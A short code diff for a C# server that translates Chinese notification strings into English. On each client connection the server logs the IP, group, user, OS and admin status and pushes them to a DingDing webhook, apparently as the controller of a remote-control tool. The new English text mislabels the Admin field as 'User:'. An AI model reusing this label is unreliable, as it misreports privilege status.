@@ -103,11 +103,11 @@ namespace Server.Handle_Packet
                     {
                         try
                         {
-                            string content = $"客户端 {client.Ip} 已上线" + "\n"
-                                + "分组:" + unpack_msgpack.ForcePathObject("Group").AsString + "\n"
-                                + "用户名:" + unpack_msgpack.ForcePathObject("User").AsString + "\n"
-                                    + "系统:" + unpack_msgpack.ForcePathObject("OS").AsString + "\n"
-                                    + "权限:" + unpack_msgpack.ForcePathObject("Admin").AsString;
+                            string content = $"Client {client.Ip} connected" + "\n"
+                                + "Group:" + unpack_msgpack.ForcePathObject("Group").AsString + "\n"
+                                + "User:" + unpack_msgpack.ForcePathObject("User").AsString + "\n"
+                                    + "OS:" + unpack_msgpack.ForcePathObject("OS").AsString + "\n"
+                                    + "User:" + unpack_msgpack.ForcePathObject("Admin").AsString;
                                 DingDing.Send(Properties.Settings.Default.WebHook, Properties.Settings.Default.Secret, content);
                             } 
                             catch (Exception ex) 
@@ -117,7 +117,7 @@ namespace Server.Handle_Packet
                         }
                     }
 
-                    new HandleLogs().Addmsg($"客户端 {client.Ip} 已上线", Color.Green);
+                    new HandleLogs().Addmsg($"Client {client.Ip} connected", Color.Green);
                     SoundPlayer sp = new SoundPlayer(Server.Properties.Resources.online);
                     sp.Load();
                     sp.Play();
